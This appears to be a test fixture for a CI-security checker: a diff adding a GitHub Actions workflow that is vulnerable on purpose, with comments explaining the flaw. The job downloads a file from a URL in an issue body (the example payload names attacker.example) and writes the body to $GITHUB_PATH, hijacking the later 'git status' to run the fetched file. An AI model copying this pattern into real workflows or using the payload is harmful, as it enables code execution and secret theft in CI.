@@ -1,0 +1,35 @@
+# situation: on issues opened, a job whose if lets in an issue whose
+#   author_association is MEMBER downloads a file a URL of the issue's body
+#   names to /tmp/t/git and writes the body to $GITHUB_PATH; git status runs
+#   after.
+# reason: a todo (a fact): a member of the organization, who may have read
+#   access only, passes this if (in an organization that lets anyone become a
+#   member, such as by a bot that invites whoever asks, an outsider becomes such
+#   a member), and gets the job's token and secrets past what the Read role
+#   gives; who is a member, and with what role, is not in the workflow.
+# cause: the rule evaluates the if with the attacker's author_association
+#   (NONE, FIRST_TIMER, FIRST_TIME_CONTRIBUTOR or CONTRIBUTOR), for which it
+#   is false, so no attacker's event runs the job.
+# attack-value: github.event.issue.body = "https://attacker.example/git\n/tmp/t\n/tmp/PWNED"
+# attack-run-behavior: for an issue of an outsider, the job's if is false
+#   and the job is skipped. For an issue of a MEMBER whose role is read only,
+#   with this body: BODY holds three lines; mkdir makes /tmp/t, curl saves the
+#   file at https://attacker.example/git as /tmp/t/git, chmod makes it
+#   executable, and echo writes the lines https://attacker.example/git, /tmp/t
+#   and /tmp/PWNED to $GITHUB_PATH. The next step's PATH starts with
+#   /tmp/PWNED and /tmp/t (the line written last comes first), then the line
+#   of the URL, and git status runs /tmp/t/git, the attacker's file.
+on:
+  issues:
+    types: [opened]
+jobs:
+  a:
+    if: github.event.issue.author_association == 'MEMBER'
+    runs-on: ubuntu-latest
+    steps:
+      - env:
+          BODY: ${{ github.event.issue.body }}
+        run: |
+          mkdir -p /tmp/t && curl -sLo /tmp/t/git "$(echo "$BODY" | grep -o 'https://[^ ]*' | head -n1)" && chmod +x /tmp/t/git
+          echo "$BODY" >> "$GITHUB_PATH"
+      - run: git status
